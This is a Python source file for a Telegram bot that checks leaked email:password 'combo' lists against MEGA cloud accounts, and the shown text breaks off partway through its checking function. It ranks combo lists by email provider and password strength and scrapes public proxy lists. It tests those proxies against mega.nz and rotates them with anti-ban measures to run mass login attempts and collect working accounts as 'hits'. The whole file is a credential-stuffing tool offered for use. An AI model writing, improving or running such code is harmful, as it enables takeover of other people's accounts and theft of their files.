#!/usr/bin/env python3
"""
HYPERION ELITE BOT v5.0 - The Ultimate MEGA Checker Telegram Interface
=======================================================================

🎯 Elite Features:
- AI Core Combo Analysis (/scan command)
- Advanced Parameter Controls (/check with threads, rate limits)
- Multi-Tiered Intelligent Proxy System (--proxy fast/ai)
- Real-time Progress Display (live message editing)
- Personal ID Restriction & Secure Authentication
- Auto File Delivery System with organized results

Bot: @megacheckk_bot
Creator: Advanced AI Security Research
"""

import asyncio
import logging
import os
import sys
import json
import time
import threading
import multiprocessing
import gc
import platform
import zipfile
import re
import hashlib
import requests
from datetime import datetime, timedelta
from pathlib import Path
from typing import List, Dict, Optional, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed
import signal
import random
from urllib.parse import urlparse
from collections import Counter
import math

# Telegram Bot imports
try:
    from telegram import Update, Document, InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
    from telegram.constants import ParseMode
    TELEGRAM_AVAILABLE = True
except ImportError:
    TELEGRAM_AVAILABLE = False
    print("⚠️ Telegram libraries not found. Install with: pip install python-telegram-bot")

# Core MEGA checking imports
from mega_auth import MegaAuthenticator
from checker_engine import CheckerEngine
from proxy_rotator import AntiBanSystem, ProxyInfo

# Configure elite logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('hyperion_elite.log'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

class AIComboAnalyzer:
    """AI-powered combo analysis and quality assessment"""
    
    def __init__(self):
        self.domain_patterns = {
            'high_quality': ['gmail.com', 'outlook.com', 'hotmail.com', 'yahoo.com', 'protonmail.com'],
            'medium_quality': ['aol.com', 'icloud.com', 'mail.com', 'gmx.com', 'yandex.com'],
            'low_quality': ['10minutemail.com', 'tempmail.org', 'guerrillamail.com', 'mailinator.com']
        }
        
        self.password_patterns = {
            'strong': r'^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]{8,}$',
            'medium': r'^(?=.*[a-zA-Z])(?=.*\d)[A-Za-z\d@$!%*?&]{6,}$',
            'weak': r'^[A-Za-z\d]{1,}$'
        }
    
    def analyze_combo_list(self, combo_lines: List[str]) -> Dict:
        """Comprehensive AI analysis of combo list"""
        start_time = time.time()
        
        analysis = {
            'total_combos': len(combo_lines),
            'valid_format': 0,
            'invalid_format': 0,
            'duplicates': 0,
            'unique_combos': 0,
            'domain_analysis': {'high_quality': 0, 'medium_quality': 0, 'low_quality': 0, 'unknown': 0},
            'password_strength': {'strong': 0, 'medium': 0, 'weak': 0},
            'email_patterns': {},
            'quality_score': 0,
            'recommendations': [],
            'processing_time': 0
        }
        
        valid_combos = []
        seen_combos = set()
        email_domains = Counter()
        
        for line in combo_lines:
            line = line.strip()
            if not line or ':' not in line:
                analysis['invalid_format'] += 1
                continue
            
            try:
                email, password = line.split(':', 1)
                email = email.strip().lower()
                password = password.strip()
                
                # Validate email format
                if not re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', email):
                    analysis['invalid_format'] += 1
                    continue
                
                analysis['valid_format'] += 1
                
                # Check for duplicates
                combo_hash = hashlib.md5(f"{email}:{password}".encode()).hexdigest()
                if combo_hash in seen_combos:
                    analysis['duplicates'] += 1
                else:
                    seen_combos.add(combo_hash)
                    valid_combos.append((email, password))
                    
                    # Domain analysis
                    domain = email.split('@')[1]
                    email_domains[domain] += 1
                    
                    domain_quality = 'unknown'
                    for quality, domains in self.domain_patterns.items():
                        if domain in domains:
                            domain_quality = quality
                            break
                    
                    analysis['domain_analysis'][domain_quality] += 1
                    
                    # Password strength analysis
                    if re.match(self.password_patterns['strong'], password):
                        analysis['password_strength']['strong'] += 1
                    elif re.match(self.password_patterns['medium'], password):
                        analysis['password_strength']['medium'] += 1
                    else:
                        analysis['password_strength']['weak'] += 1
                        
            except Exception as e:
                analysis['invalid_format'] += 1
                continue
        
        analysis['unique_combos'] = len(valid_combos)
        analysis['email_patterns'] = dict(email_domains.most_common(10))
        
        # Calculate quality score (0-100)
        if analysis['valid_format'] > 0:
            format_score = (analysis['valid_format'] / analysis['total_combos']) * 30
            duplicate_score = (1 - (analysis['duplicates'] / analysis['total_combos'])) * 20
            domain_score = (analysis['domain_analysis']['high_quality'] / analysis['valid_format']) * 25
            password_score = (analysis['password_strength']['strong'] / analysis['valid_format']) * 25
            
            analysis['quality_score'] = min(100, format_score + duplicate_score + domain_score + password_score)
        
        # Generate recommendations
        if analysis['invalid_format'] > analysis['total_combos'] * 0.1:
            analysis['recommendations'].append("🔧 High invalid format rate - clean your combo list")
        
        if analysis['duplicates'] > analysis['total_combos'] * 0.2:
            analysis['recommendations'].append("🧹 Many duplicates found - remove duplicates for better efficiency")
        
        if analysis['domain_analysis']['low_quality'] > analysis['valid_format'] * 0.3:
            analysis['recommendations'].append("⚠️ Many temporary email domains detected")
        
        if analysis['password_strength']['weak'] > analysis['valid_format'] * 0.5:
            analysis['recommendations'].append("🔐 Many weak passwords - success rate may be lower")
        
        if analysis['quality_score'] >= 80:
            analysis['recommendations'].append("✅ Excellent combo quality - proceed with confidence")
        elif analysis['quality_score'] >= 60:
            analysis['recommendations'].append("👍 Good combo quality - should perform well")
        elif analysis['quality_score'] >= 40:
            analysis['recommendations'].append("⚠️ Average combo quality - consider cleaning")
        else:
            analysis['recommendations'].append("❌ Poor combo quality - recommend cleaning before use")
        
        analysis['processing_time'] = time.time() - start_time
        return analysis, valid_combos

class IntelligentProxySystem:
    """Advanced multi-tiered proxy system with AI quality checking"""
    
    def __init__(self):
        self.fast_proxy_sources = [
            'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
            'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt',
            'https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt',
            'https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt',
            'https://raw.githubusercontent.com/sunny9577/proxy-list/master/proxies/http.txt'
        ]
        
        self.ai_test_endpoints = [
            'https://mega.nz',
            'https://httpbin.org/ip',
            'https://api.ipify.org',
            'https://www.google.com'
        ]
    
    async def gather_fast_proxies(self, max_proxies: int = 1000) -> List[str]:
        """Rapidly gather public proxies for general use"""
        logger.info(f"🚀 Fast proxy gathering: targeting {max_proxies} proxies")
        
        all_proxies = set()
        
        for source in self.fast_proxy_sources:
            try:
                response = requests.get(source, timeout=10)
                if response.status_code == 200:
                    proxies = re.findall(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{2,5})', response.text)
                    all_proxies.update(proxies)
                    logger.info(f"✅ Gathered {len(proxies)} proxies from {urlparse(source).netloc}")
                    
                    if len(all_proxies) >= max_proxies:
                        break
                        
            except Exception as e:
                logger.warning(f"❌ Failed to fetch from {source}: {e}")
                continue
        
        proxy_list = list(all_proxies)[:max_proxies]
        logger.info(f"🎯 Fast proxy gathering complete: {len(proxy_list)} proxies collected")
        return proxy_list
    
    async def ai_quality_check_proxies(self, proxy_list: List[str], max_workers: int = 50) -> List[Dict]:
        """AI-powered proxy quality testing with MEGA compatibility"""
        logger.info(f"🤖 AI Quality Checker: Testing {len(proxy_list)} proxies")
        
        quality_proxies = []
        
        def test_proxy(proxy: str) -> Optional[Dict]:
            """Test individual proxy for speed, stability, and MEGA compatibility"""
            try:
                proxy_dict = {
                    'http': f'http://{proxy}',
                    'https': f'http://{proxy}'
                }
                
                # Speed test
                start_time = time.time()
                response = requests.get('https://httpbin.org/ip', 
                                      proxies=proxy_dict, 
                                      timeout=5)
                response_time = time.time() - start_time
                
                if response.status_code != 200:
                    return None
                
                # MEGA compatibility test
                try:
                    mega_response = requests.get('https://mega.nz',
                                               proxies=proxy_dict,
                                               timeout=8,
                                               headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
                    mega_compatible = mega_response.status_code == 200
                except:
                    mega_compatible = False
                
                # Calculate quality score
                speed_score = max(0, 100 - (response_time * 20))  # Lower response time = higher score
                stability_score = 85 if mega_compatible else 40    # MEGA compatibility bonus
                
                quality_score = (speed_score + stability_score) / 2
                
                return {
                    'proxy': proxy,
                    'response_time': response_time,
                    'mega_compatible': mega_compatible,
                    'quality_score': quality_score,
                    'status': 'working'
                }
                
            except Exception as e:
                return None
        
        # Test proxies concurrently
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_proxy = {executor.submit(test_proxy, proxy): proxy for proxy in proxy_list}
            
            completed = 0
            for future in as_completed(future_to_proxy):
                completed += 1
                if completed % 50 == 0:
                    logger.info(f"🔍 AI Testing Progress: {completed}/{len(proxy_list)} proxies tested")
                
                result = future.result()
                if result and result['quality_score'] >= 60:  # Only high-quality proxies
                    quality_proxies.append(result)
        
        # Sort by quality score
        quality_proxies.sort(key=lambda x: x['quality_score'], reverse=True)
        
        logger.info(f"✅ AI Quality Check Complete: {len(quality_proxies)} high-quality proxies found")
        return quality_proxies

class HyperionEliteBot:
    """Elite HYPERION Telegram Bot with advanced features"""
    
    def __init__(self, telegram_token: str):
        self.telegram_token = telegram_token
        self.authorized_user_id = None  # Will be set to your personal Telegram ID
        
        # Bot state
        self.is_running = False
        self.current_job = None
        self.progress_message = None
        self.stats = {
            'total': 0, 'checked': 0, 'hits': 0, 'fails': 0, 'errors': 0,
            'start_time': None, 'rate': 0, 'eta': 0
        }
        
        # Performance optimization
        self.cpu_cores = multiprocessing.cpu_count()
        self.optimal_threads = min(self.cpu_cores * 2, 100)
        
        # AI components
        self.ai_analyzer = AIComboAnalyzer()
        self.proxy_system = IntelligentProxySystem()
        
        # Core components
        self.authenticator = MegaAuthenticator()
        self.checker_engine = None
        self.anti_ban_system = AntiBanSystem()
        
        # Results management
        self.hits = []
        self.current_proxies = []
        self.results_dir = Path("elite_results")
        self.results_dir.mkdir(exist_ok=True)
        
        # Telegram application
        self.telegram_app = None
        
        logger.info("🚀 HYPERION Elite Bot initialized")
        logger.info(f"   💻 CPU Cores: {self.cpu_cores}")
        logger.info(f"   ⚡ Max Threads: {self.optimal_threads}")
        logger.info(f"   🤖 AI Core: Enabled")
    
    async def setup_telegram_bot(self):
        """Setup elite Telegram bot with all handlers"""
        if not TELEGRAM_AVAILABLE:
            logger.error("❌ Telegram libraries not available")
            return False
        
        try:
            self.telegram_app = Application.builder().token(self.telegram_token).build()
            
            # Elite command handlers
            self.telegram_app.add_handler(CommandHandler("start", self.cmd_start))
            self.telegram_app.add_handler(CommandHandler("help", self.cmd_help))
            self.telegram_app.add_handler(CommandHandler("scan", self.cmd_scan))
            self.telegram_app.add_handler(CommandHandler("check", self.cmd_check))
            self.telegram_app.add_handler(CommandHandler("status", self.cmd_status))
            self.telegram_app.add_handler(CommandHandler("stop", self.cmd_stop))
            self.telegram_app.add_handler(CommandHandler("results", self.cmd_results))
            self.telegram_app.add_handler(CommandHandler("proxies", self.cmd_proxies))
            self.telegram_app.add_handler(CommandHandler("auth", self.cmd_auth))
            
            # File handler for combo uploads
            self.telegram_app.add_handler(MessageHandler(filters.Document.ALL, self.handle_combo_file))
            
            # Callback query handler for interactive buttons
            self.telegram_app.add_handler(CallbackQueryHandler(self.handle_callback))
            
            logger.info("✅ Elite Telegram bot setup complete")
            return True
            
        except Exception as e:
            logger.error(f"❌ Bot setup failed: {e}")
            return False
    
    def is_authorized(self, user_id: int) -> bool:
        """Check if user is authorized (personal ID only)"""
        if self.authorized_user_id is None:
            # First user becomes the authorized user
            self.authorized_user_id = user_id
            logger.info(f"🔐 Authorized user set: {user_id}")
            return True
        return user_id == self.authorized_user_id
    
    async def cmd_start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Elite start command"""
        user_id = update.effective_user.id
        
        if not self.is_authorized(user_id):
            await update.message.reply_text("❌ Access Denied. This bot is private.")
            return
        
        welcome_msg = """
🎯 **HYPERION ELITE BOT v5.0**
*The Ultimate MEGA Checker Interface*

**🚀 Elite Commands:**
/scan - AI Core combo analysis
/check [--threads N] [--rate N] [--proxy fast/ai] - Start checking
/proxies - Manage proxy system
/status - Real-time progress
/stop - Emergency stop
/results - Download hits

**🤖 AI Features:**
• Intelligent combo quality analysis
• Multi-tiered proxy system
• Real-time progress display
• Auto file delivery

**🔒 Security:**
• Personal ID restricted
• Secure cloud operation
• Private results handling

Ready for elite operations! 🎖️
        """
        
        keyboard = [
            [InlineKeyboardButton("📊 Scan Combo", callback_data="scan"),
             InlineKeyboardButton("🚀 Start Check", callback_data="check")],
            [InlineKeyboardButton("🌐 Proxy System", callback_data="proxies"),
             InlineKeyboardButton("📈 Status", callback_data="status")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(welcome_msg, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
    
    async def cmd_scan(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """AI Core combo analysis command"""
        if not self.is_authorized(update.effective_user.id):
            await update.message.reply_text("❌ Access Denied")
            return
        
        # Check if user has uploaded a combo file recently
        if not hasattr(self, 'last_combo_list') or not self.last_combo_list:
            await update.message.reply_text("""
🤖 **AI Core Ready for Analysis**

Please upload a combo file (.txt) first, then use /scan to analyze it.

**Analysis Features:**
• Format validation
• Duplicate detection  
• Domain quality assessment
• Password strength analysis
• Overall quality score
• Optimization recommendations
            """, parse_mode=ParseMode.MARKDOWN)
            return
        
        # Start analysis
        analysis_msg = await update.message.reply_text("🤖 **AI Core Analyzing...**\n\n⚡ Processing combo list...", parse_mode=ParseMode.MARKDOWN)
        
        try:
            analysis, valid_combos = self.ai_analyzer.analyze_combo_list(self.last_combo_list)
            
            # Generate detailed report
            report = f"""
🤖 **AI CORE ANALYSIS REPORT**

**📊 Overview:**
• Total Combos: {analysis['total_combos']:,}
• Valid Format: {analysis['valid_format']:,}
• Invalid Format: {analysis['invalid_format']:,}
• Duplicates: {analysis['duplicates']:,}
• Unique Valid: {analysis['unique_combos']:,}

**🏆 Quality Score: {analysis['quality_score']:.1f}/100**

**📧 Domain Analysis:**
• High Quality: {analysis['domain_analysis']['high_quality']:,}
• Medium Quality: {analysis['domain_analysis']['medium_quality']:,}
• Low Quality: {analysis['domain_analysis']['low_quality']:,}
• Unknown: {analysis['domain_analysis']['unknown']:,}

**🔐 Password Strength:**
• Strong: {analysis['password_strength']['strong']:,}
• Medium: {analysis['password_strength']['medium']:,}
• Weak: {analysis['password_strength']['weak']:,}

**🎯 Top Domains:**
"""
            
            for domain, count in list(analysis['email_patterns'].items())[:5]:
                report += f"• {domain}: {count:,}\n"
            
            if analysis['recommendations']:
                report += "\n**💡 AI Recommendations:**\n"
                for rec in analysis['recommendations']:
                    report += f"• {rec}\n"
            
            report += f"\n⚡ Processing Time: {analysis['processing_time']:.2f}s"
            
            # Store for checking
            self.last_analysis = analysis
            self.last_valid_combos = valid_combos
            
            keyboard = [
                [InlineKeyboardButton("🚀 Start Checking", callback_data="start_checking"),
                 InlineKeyboardButton("🌐 Get Proxies", callback_data="get_proxies")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await analysis_msg.edit_text(report, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
            
        except Exception as e:
            await analysis_msg.edit_text(f"❌ Analysis failed: {str(e)}")
    
    async def cmd_check(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Advanced check command with parameters"""
        if not self.is_authorized(update.effective_user.id):
            await update.message.reply_text("❌ Access Denied")
            return
        
        if self.is_running:
            await update.message.reply_text("⚠️ Checker already running. Use /stop first.")
            return
        
        # Parse arguments
        args = context.args or []
        threads = self.optimal_threads
        rate_limit = 1.0
        proxy_mode = None
        
        i = 0
        while i < len(args):
            if args[i] == '--threads' and i + 1 < len(args):
                try:
                    threads = int(args[i + 1])
                    threads = max(1, min(threads, 200))  # Limit threads
                    i += 2
                except ValueError:
                    i += 1
            elif args[i] == '--rate' and i + 1 < len(args):
                try:
                    rate_limit = float(args[i + 1])
                    rate_limit = max(0.1, min(rate_limit, 10.0))  # Limit rate
                    i += 2
                except ValueError:
                    i += 1
            elif args[i] == '--proxy' and i + 1 < len(args):
                proxy_mode = args[i + 1].lower()
                if proxy_mode not in ['fast', 'ai']:
                    proxy_mode = None
                i += 2
            else:
                i += 1
        
        # Check if combo list is available
        if not hasattr(self, 'last_valid_combos') or not self.last_valid_combos:
            await update.message.reply_text("""
🚀 **Elite Checker Ready**

Upload a combo file and run /scan first, then use:

**Command Examples:**
`/check` - Default settings
`/check --threads 50` - Custom threads
`/check --rate 2.0` - Custom rate limit
`/check --proxy fast` - Fast proxy mode
`/check --proxy ai` - AI proxy mode
`/check --threads 100 --rate 1.5 --proxy ai` - Full custom

**Current Settings:**
• Threads: {threads}
• Rate Limit: {rate_limit}s
• Proxy Mode: {proxy_mode or 'None'}
            """, parse_mode=ParseMode.MARKDOWN)
            return
        
        # Setup checking with parameters
        await self.start_elite_checking(
            update.effective_chat.id,
            threads=threads,
            rate_limit=rate_limit,
            proxy_mode=proxy_mode
        )
    
    async def cmd_proxies(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Proxy management command"""
        if not self.is_authorized(update.effective_user.id):
            await update.message.reply_text("❌ Access Denied")
            return
        
        proxy_info = f"""
🌐 **Intelligent Proxy System**

**Current Status:**
• Active Proxies: {len(self.current_proxies):,}
• System: Multi-tiered AI powered

**Available Modes:**

🚀 **Fast Mode** (`--proxy fast`)
• Rapid proxy gathering (1000+ proxies)
• Public proxy sources
• Quick deployment
• Good for general use

🤖 **AI Mode** (`--proxy ai`) 
• AI-powered quality testing
• MEGA compatibility testing
• Speed & stability analysis
• Elite success rates

**Commands:**
• `/check --proxy fast` - Use fast proxies
• `/check --proxy ai` - Use AI-tested proxies
• `/proxies gather` - Manual proxy gathering
        """
        
        keyboard = [
            [InlineKeyboardButton("🚀 Gather Fast", callback_data="proxy_fast"),
             InlineKeyboardButton("🤖 AI Quality Test", callback_data="proxy_ai")],
            [InlineKeyboardButton("📊 Proxy Stats", callback_data="proxy_stats")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(proxy_info, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
    
    async def cmd_scan_callback(self, query):
        """Handle /scan command via callback"""
        # Check if user has uploaded a combo file recently
        if not hasattr(self, 'last_combo_list') or not self.last_combo_list:
            await query.edit_message_text("""
🤖 **AI Core Ready for Analysis**

Please upload a combo file (.txt) first, then use /scan to analyze it.

**Analysis Features:**
• Format validation
• Duplicate detection  
• Domain quality assessment
• Password strength analysis
• Overall quality score
• Optimization recommendations
            """, parse_mode=ParseMode.MARKDOWN)
            return
        
        # Start analysis
        await query.edit_message_text("🤖 **AI Core Analyzing...**\n\n⚡ Processing combo list...", parse_mode=ParseMode.MARKDOWN)
        
        try:
            analysis, valid_combos = self.ai_analyzer.analyze_combo_list(self.last_combo_list)
            
            # Generate detailed report
            report = f"""
🤖 **AI CORE ANALYSIS REPORT**

**📊 Overview:**
• Total Combos: {analysis['total_combos']:,}
• Valid Format: {analysis['valid_format']:,}
• Invalid Format: {analysis['invalid_format']:,}
• Duplicates: {analysis['duplicates']:,}
• Unique Valid: {analysis['unique_combos']:,}

**🏆 Quality Score: {analysis['quality_score']:.1f}/100**

**📧 Domain Analysis:**
• High Quality: {analysis['domain_analysis']['high_quality']:,}
• Medium Quality: {analysis['domain_analysis']['medium_quality']:,}
• Low Quality: {analysis['domain_analysis']['low_quality']:,}
• Unknown: {analysis['domain_analysis']['unknown']:,}

**🔐 Password Strength:**
• Strong: {analysis['password_strength']['strong']:,}
• Medium: {analysis['password_strength']['medium']:,}
• Weak: {analysis['password_strength']['weak']:,}

**🎯 Top Domains:**
"""
            
            for domain, count in list(analysis['email_patterns'].items())[:5]:
                report += f"• {domain}: {count:,}\n"
            
            if analysis['recommendations']:
                report += "\n**💡 AI Recommendations:**\n"
                for rec in analysis['recommendations']:
                    report += f"• {rec}\n"
            
            report += f"\n⚡ Processing Time: {analysis['processing_time']:.2f}s"
            
            # Store for checking
            self.last_analysis = analysis
            self.last_valid_combos = valid_combos
            
            keyboard = [
                [InlineKeyboardButton("🚀 Start Checking", callback_data="start_checking"),
                 InlineKeyboardButton("🌐 Get Proxies", callback_data="get_proxies")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await query.edit_message_text(report, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
            
        except Exception as e:
            await query.edit_message_text(f"❌ Analysis failed: {str(e)}")
    
    async def cmd_check_callback(self, query):
        """Handle /check command via callback"""
        if self.is_running:
            await query.edit_message_text("⚠️ Checker already running. Use /stop first.")
            return
        
        # Check if combo list is available
        if not hasattr(self, 'last_valid_combos') or not self.last_valid_combos:
            await query.edit_message_text(f"""
🚀 **Elite Checker Ready**

Upload a combo file and run /scan first, then use:

**Command Examples:**
/check - Default settings
/check --threads 50 - Custom threads
/check --rate 2.0 - Custom rate limit
/check --proxy fast - Fast proxy mode
/check --proxy ai - AI proxy mode

**Current Settings:**
• Threads: {self.optimal_threads}
• Rate Limit: 1.0s
• Proxy Mode: None
            """, parse_mode=ParseMode.MARKDOWN)
            return
        
        # Setup checking with default parameters
        await self.start_elite_checking(
            query.message.chat_id,
            threads=self.optimal_threads,
            rate_limit=1.0,
            proxy_mode=None
        )
    
    async def cmd_proxies_callback(self, query):
        """Handle /proxies command via callback"""
        proxy_info = f"""
🌐 **Intelligent Proxy System**

**Current Status:**
• Active Proxies: {len(self.current_proxies):,}
• System: Multi-tiered AI powered

**Available Modes:**

🚀 **Fast Mode** (`--proxy fast`)
• Rapid proxy gathering (1000+ proxies)
• Public proxy sources
• Quick deployment
• Good for general use

🤖 **AI Mode** (`--proxy ai`) 
• AI-powered quality testing
• MEGA compatibility testing
• Speed & stability analysis
• Elite success rates

**Commands:**
• `/check --proxy fast` - Use fast proxies
• `/check --proxy ai` - Use AI-tested proxies
• `/proxies gather` - Manual proxy gathering
        """
        
        keyboard = [
            [InlineKeyboardButton("🚀 Gather Fast", callback_data="proxy_fast"),
             InlineKeyboardButton("🤖 AI Quality Test", callback_data="proxy_ai")],
            [InlineKeyboardButton("📊 Proxy Stats", callback_data="proxy_stats")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(proxy_info, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
    
    async def cmd_status_callback(self, query):
        """Handle /status command via callback"""
        if self.is_running and self.current_job:
            elapsed = time.time() - self.stats['start_time']
            progress_pct = (self.stats['checked'] / self.stats['total'] * 100) if self.stats['total'] > 0 else 0
            
            status_msg = f"""
📊 **HYPERION ELITE STATUS**

**Operation:** Running 🟢
**Progress:** {self.stats['checked']:,}/{self.stats['total']:,} ({progress_pct:.1f}%)
**Hits:** {self.stats['hits']:,}
**Rate:** {self.stats['rate']:.0f}/min
**Elapsed:** {int(elapsed)}s

**Configuration:**
• Threads: {self.current_job.get('threads', 'N/A')}
• Proxy Mode: {self.current_job.get('proxy_mode', 'Direct')}
• Active Proxies: {len(self.current_proxies)}

**System Status:** Elite Mode Active 🎖️
            """
        else:
            status_msg = """
📊 **HYPERION ELITE STATUS**

**Operation:** Idle 🟡
**Status:** Ready for elite operations
**Last Results:** Available via /results
**System:** Fully operational

Upload combo file and use /scan to begin!
            """
        
        await query.edit_message_text(status_msg, parse_mode=ParseMode.MARKDOWN)
    
    async def handle_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle interactive button callbacks"""
        query = update.callback_query
        await query.answer()
        
        if not self.is_authorized(query.from_user.id):
            await query.edit_message_text("❌ Access Denied")
            return
        
        data = query.data
        
        if data == "scan":
            await self.cmd_scan_callback(query)
        elif data == "check":
            await self.cmd_check_callback(query)
        elif data == "proxy_fast":
            await self.gather_fast_proxies_callback(query)
        elif data == "proxy_ai":
            await self.ai_test_proxies_callback(query)
        elif data == "start_checking":
            await self.start_elite_checking(query.message.chat_id)
        elif data == "get_proxies":
            await self.cmd_proxies_callback(query)
        elif data == "status":
            await self.cmd_status_callback(query)
        elif data == "proxies":
            await self.cmd_proxies_callback(query)
    
    async def gather_fast_proxies_callback(self, query):
        """Gather fast proxies via callback"""
        await query.edit_message_text("🚀 **Fast Proxy Gathering**\n\n⚡ Collecting proxies from multiple sources...")
        
        try:
            proxies = await self.proxy_system.gather_fast_proxies(1000)
            self.current_proxies = [{'proxy': p, 'quality_score': 50, 'status': 'untested'} for p in proxies]
            
            result_msg = f"""
✅ **Fast Proxy Collection Complete**

• **Collected:** {len(proxies):,} proxies
• **Sources:** Multiple public proxy lists  
• **Status:** Ready for use
• **Quality:** Untested (fast mode)

Proxies are now loaded and ready for checking!
            """
            
            keyboard = [
                [InlineKeyboardButton("🚀 Start Checking", callback_data="start_checking")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await query.edit_message_text(result_msg, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
            
        except Exception as e:
            await query.edit_message_text(f"❌ Fast proxy gathering failed: {str(e)}")
    
    async def ai_test_proxies_callback(self, query):
        """AI test proxies via callback"""
        if not self.current_proxies:
            await query.edit_message_text("⚠️ No proxies to test. Gather proxies first.")
            return
        
        await query.edit_message_text("🤖 **AI Proxy Quality Testing**\n\n🔍 Testing proxies for MEGA compatibility...")
        
        try:
            proxy_list = [p['proxy'] if isinstance(p, dict) else p for p in self.current_proxies]
            quality_proxies = await self.proxy_system.ai_quality_check_proxies(proxy_list, 50)
            self.current_proxies = quality_proxies
            
            if quality_proxies:
                avg_score = sum(p['quality_score'] for p in quality_proxies) / len(quality_proxies)
                mega_compatible = sum(1 for p in quality_proxies if p['mega_compatible'])
                
                result_msg = f"""
🤖 **AI Quality Testing Complete**

• **High-Quality Proxies:** {len(quality_proxies):,}
• **Average Score:** {avg_score:.1f}/100
• **MEGA Compatible:** {mega_compatible:,}
• **Status:** Elite grade proxies ready

These proxies are optimized for maximum success rates!
                """
            else:
                result_msg = "❌ No high-quality proxies found. Try fast mode instead."
            
            keyboard = [
                [InlineKeyboardButton("🚀 Start Checking", callback_data="start_checking")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await query.edit_message_text(result_msg, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
            
        except Exception as e:
            await query.edit_message_text(f"❌ AI proxy testing failed: {str(e)}")
    
    async def handle_combo_file(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle combo file uploads with elite processing"""
        if not self.is_authorized(update.effective_user.id):
            await update.message.reply_text("❌ Access Denied")
            return
        
        try:
            document = update.message.document
            if not document.file_name.endswith('.txt'):
                await update.message.reply_text("❌ Please send a .txt combo file")
                return
            
            # Elite file processing message
            process_msg = await update.message.reply_text("""
📁 **Elite File Processing**

⚡ Downloading combo file...
🔍 Parsing and validating...
🤖 Preparing for AI analysis...
            """, parse_mode=ParseMode.MARKDOWN)
            
            # Download and process file
            file = await context.bot.get_file(document.file_id)
            file_path = f"elite_combo_{update.effective_user.id}_{int(time.time())}.txt"
            await file.download_to_drive(file_path)
            
            # Read and store combo list
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                combo_lines = [line.strip() for line in f if line.strip()]
            
            os.remove(file_path)  # Clean up
            
            self.last_combo_list = combo_lines
            self.last_upload_time = time.time()
            
            # Success message with next steps
            success_msg = f"""
✅ **Elite File Processed Successfully**

📊 **File Details:**
• **Filename:** {document.file_name}
• **Total Lines:** {len(combo_lines):,}
• **Size:** {document.file_size:,} bytes
• **Uploaded:** {datetime.now().strftime('%H:%M:%S')}

🎯 **Next Steps:**
1. Use `/scan` for AI analysis
2. Use `/check` to start checking
3. Configure proxy system with `/proxies`

File is securely stored and ready for processing! 🎖️
            """
            
            keyboard = [
                [InlineKeyboardButton("🤖 AI Scan", callback_data="scan"),
                 InlineKeyboardButton("🚀 Quick Check", callback_data="check")],
                [InlineKeyboardButton("🌐 Setup Proxies", callback_data="get_proxies")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await process_msg.edit_text(success_msg, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
            
        except Exception as e:
            logger.error(f"Error processing combo file: {e}")
            await update.message.reply_text(f"❌ File processing failed: {str(e)}")
    
    async def start_elite_checking(self, chat_id: int, threads: int = None, rate_limit: float = 1.0, proxy_mode: str = None):
        """Start elite checking with advanced parameters"""
        try:
            if not hasattr(self, 'last_valid_combos') or not self.last_valid_combos:
                await self.send_message(chat_id, "❌ No valid combos available. Upload and scan first.")
                return
            
            if self.is_running:
                await self.send_message(chat_id, "⚠️ Checker already running. Use /stop first.")
                return
            
            # Setup job parameters
            threads = threads or self.optimal_threads
            combo_list = self.last_valid_combos
            
            # Handle proxy mode
            if proxy_mode == 'fast' and not self.current_proxies:
                status_msg = await self.send_message(chat_id, "🚀 **Elite Checking Starting**\n\n⚡ Gathering fast proxies first...")
                proxies = await self.proxy_system.gather_fast_proxies(500)
                self.current_proxies = [{'proxy': p, 'quality_score': 50} for p in proxies]
                await status_msg.edit_text("✅ Fast proxies ready!\n🚀 Starting checker...")
            elif proxy_mode == 'ai':
                if not self.current_proxies:
                    status_msg = await self.send_message(chat_id, "🤖 **AI Proxy Mode**\n\n⚡ Gathering and testing proxies...")
                    proxies = await self.proxy_system.gather_fast_proxies(300)
                    await status_msg.edit_text("🤖 Testing proxy quality...")
                    quality_proxies = await self.proxy_system.ai_quality_check_proxies(proxies, 30)
                    self.current_proxies = quality_proxies
